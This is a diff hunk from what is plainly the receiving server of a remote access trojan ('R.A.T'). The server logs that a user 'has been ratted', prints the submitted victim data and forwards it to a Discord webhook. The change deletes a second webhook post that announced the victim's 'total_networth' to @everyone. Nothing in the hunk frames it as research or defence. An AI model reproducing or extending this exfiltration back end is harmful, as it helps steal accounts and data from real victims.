@@ -146,17 +146,7 @@ app.post("/", (req, res) => {
                 }).catch(err => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
-                
-                post(process.env.WEBHOOK, JSON.stringify({
-                    content: `@everyone - ${total_networth}`,
-                    attachments: []
-                }), {
-                    headers: {
-                        "Content-Type": "application/json"
-                    }
-                }).catch(err => {
-                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                })
+
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
